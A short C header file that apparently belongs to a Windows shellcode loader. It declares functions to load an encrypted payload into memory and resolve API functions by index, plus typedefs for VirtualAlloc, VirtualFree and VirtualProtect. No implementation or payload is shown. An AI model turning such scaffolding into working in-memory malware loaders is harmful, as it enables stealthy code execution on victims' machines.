#pragma once

#include <windows.h>
#include <shlwapi.h>
#include <stdint.h>
#include "mrph.h"

#define READ_FROM_FILE 1

extern void load_payload_to_mem(unsigned int *enc_shellcode_size, char **shellcode_base);
extern void *resolve_func(unsigned char i);

typedef void* (WINAPI* _pVirtualAlloc)(void*, size_t, unsigned int, unsigned int);
typedef int (WINAPI* _pVirtualFree)(LPVOID, SIZE_T, DWORD);
typedef BOOL (WINAPI *_pVirtualProtect)(void*, size_t, unsigned int, unsigned int*);